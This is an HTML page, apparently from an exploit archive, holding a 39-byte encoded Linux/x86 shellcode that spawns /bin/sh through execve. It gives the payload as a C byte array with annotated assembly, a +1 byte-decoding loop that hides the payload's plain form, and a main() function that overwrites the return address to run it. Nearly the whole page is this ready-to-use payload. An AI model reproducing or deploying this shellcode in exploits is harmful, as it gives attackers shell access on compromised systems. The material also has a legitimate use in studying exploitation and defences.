<html><head><title>Linux/x86 - execve(/bin/sh, [/bin/sh], NULL) / encoded by +1 - 39 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * (linux/x86) - execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;], NULL) / encoded by +1 - 39 bytes
 * - izik &lt;izik@tty64.org&gt;
 */

char shellcode[] = 

	&quot;\x68\x8a\xe2\xce\x81&quot;  // push $0x81cee28a 
	&quot;\x68\xb1\x0c\x53\x54&quot;  // push $0x54530cb1 
	&quot;\x68\x6a\x6f\x8a\xe4&quot;  // push $0xe48a6f6a 
	&quot;\x68\x01\x69\x30\x63&quot;  // push $0x63306901 
	&quot;\x68\x69\x30\x74\x69&quot;  // push $0x69743069 
	&quot;\x6a\x14&quot;              // push $0x14 
	&quot;\x59&quot;                  // pop %ecx 
	
	//
	// &lt;_unpack_loop&gt;:
	//

	&quot;\xfe\x0c\x0c&quot;          // decb (%esp,%ecx,1) 
	&quot;\x49&quot;                  // dec %ecx 
	&quot;\x79\xfa&quot;              // jns &lt;_unpack_loop&gt; 
	&quot;\x41&quot;                  // inc %ecx 
	&quot;\xf7\xe1&quot;              // mul %ecx 
	&quot;\x54&quot;                  // push %esp 
	&quot;\xc3&quot;;                 // ret 

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&amp;ret + 2;
	(*ret) = (int) shellcode;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
